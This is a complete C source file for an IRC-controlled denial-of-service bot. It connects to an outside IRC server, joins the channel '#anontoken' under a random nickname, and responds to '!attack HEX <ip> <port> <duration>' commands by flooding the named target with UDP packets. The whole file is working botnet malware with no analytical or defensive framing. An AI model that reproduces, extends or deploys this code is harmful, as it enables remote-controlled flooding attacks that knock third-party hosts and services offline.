#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <time.h>
#include <stdarg.h>

#define SERVER "irc.shells.org"
#define PORT 7000
#define CHANNEL "#anontoken"
#define USERNAME "YourBotUsername"
#define REALNAME "YourBotRealname"
#define MAX_IP_LEN 16

void send_data(int sockfd, const char *format, ...) {
    char buffer[512];
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);
    write(sockfd, buffer, strlen(buffer));
    // printf("SENT: %s", buffer);  // Commented out to avoid printing to terminal
}

// Function to generate a random nickname
void generate_random_nick(char *nick, size_t length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (size_t i = 0; i < length - 1; i++) {
        int key = rand() % (sizeof(charset) - 1);
        nick[i] = charset[key];
    }
    nick[length - 1] = '\0';
}

// Function to perform UDP flooding
void udp_flood(const char *ip, int port, int duration) {
    int sockfd;
    struct sockaddr_in addr;
    char payload[] = {0x55, 0x55, 0x55, 0x55, 0x00, 0x00, 0x00, 0x01};
    time_t end_time = time(NULL) + duration;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket error");
        return;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);

    while (time(NULL) < end_time) {
        for (int i = 0; i < 6; i++) {
            sendto(sockfd, payload, sizeof(payload), 0, (struct sockaddr*)&addr, sizeof(addr));
        }
    }

    close(sockfd);
}

int main() {
    int sockfd;
    struct sockaddr_in server_addr;
    struct hostent *server;
    char nickname[10];
    char recv_buffer[512];
    char ip[MAX_IP_LEN];
    int port;
    int duration;
    int usage_sent = 0;

    // Seed the random number generator
    srand(time(NULL));

    // Generate a random nickname
    generate_random_nick(nickname, sizeof(nickname));

    // Create a socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket error");
        exit(1);
    }

    // Get server by name
    server = gethostbyname(SERVER);
    if (server == NULL) {
        fprintf(stderr, "Error: No such host\n");
        exit(1);
    }

    // Set up server address struct
    bzero((char *)&server_addr, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr, (char *)&server_addr.sin_addr.s_addr, server->h_length);
    server_addr.sin_port = htons(PORT);

    // Connect to the server
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection error");
        exit(1);
    }

    // Register the bot on the IRC server with a random nickname
    send_data(sockfd, "NICK %s\r\n", nickname);
    send_data(sockfd, "USER %s 0 * :%s\r\n", USERNAME, REALNAME);

    // Join the channel
    send_data(sockfd, "JOIN %s\r\n", CHANNEL);

    // Main loop to receive data and respond to server pings
    while (1) {
        bzero(recv_buffer, sizeof(recv_buffer));
        read(sockfd, recv_buffer, sizeof(recv_buffer) - 1);

        // Respond to PING messages
        if (strncmp(recv_buffer, "PING", 4) == 0) {
            send_data(sockfd, "PONG %s\r\n", recv_buffer + 5);
        }

        // Check for attack command
        if (strstr(recv_buffer, "!attack HEX") != NULL) {
            // Extract the command parameters
            if (sscanf(recv_buffer, "!attack HEX %15s %d %d", ip, &port, &duration) == 3) {
                udp_flood(ip, port, duration);
                usage_sent = 0; // Reset usage message flag after a valid attack
            } else {
                // Send usage instructions to the channel only once
                if (!usage_sent) {
                    send_data(sockfd, "PRIVMSG %s :Usage: !attack HEX <ip> <port> <duration>\r\n", CHANNEL);
                    usage_sent = 1; // Set flag to avoid multiple usage messages
                }
            }
        }
        
        // Join the #anontoken channel after registration (look for a numeric 001 code)
        if (strstr(recv_buffer, " 001 ") != NULL) {
            send_data(sockfd, "JOIN %s\r\n", CHANNEL);
        }
    }

    // Close the socket
    close(sockfd);

    return 0;
}
